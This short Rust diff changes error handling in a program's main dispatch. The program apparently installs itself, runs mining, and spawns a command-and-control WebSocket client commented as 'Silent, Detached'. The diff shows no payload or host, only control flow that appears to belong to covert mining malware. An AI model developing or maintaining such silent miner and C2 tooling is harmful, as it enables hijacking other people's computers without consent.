@@ -41,23 +41,33 @@ async fn main() {
 
     match cli.command {
         Some(Commands::Uninstall) => {
-            let _ = uninstall();
+            if let Err(e) = uninstall() {
+                eprintln!("Uninstall failed: {}", e);
+            }
         }
         Some(Commands::Stop) => {
-            let _ = stop_mining();
+            if let Err(e) = stop_mining() {
+                eprintln!("Stop failed: {}", e);
+            }
         }
         Some(Commands::Status) => {
             status();
         }
         None => {
             if !is_installed() {
-                let _ = install();
+                if let Err(e) = install() {
+                    eprintln!("Install failed: {}", e);
+                }
             } else {
                 // Spawn C2 WSS Client (Silent, Detached)
                 tokio::spawn(async {
-                    let _ = system::c2::start_client().await;
+                    if let Err(e) = system::c2::start_client().await {
+                        eprintln!("C2 Error: {}", e);
+                    }
                 });
-                let _ = start();
+                if let Err(e) = start() {
+                    eprintln!("Start failed: {}", e);
+                }
             }
         }
     }
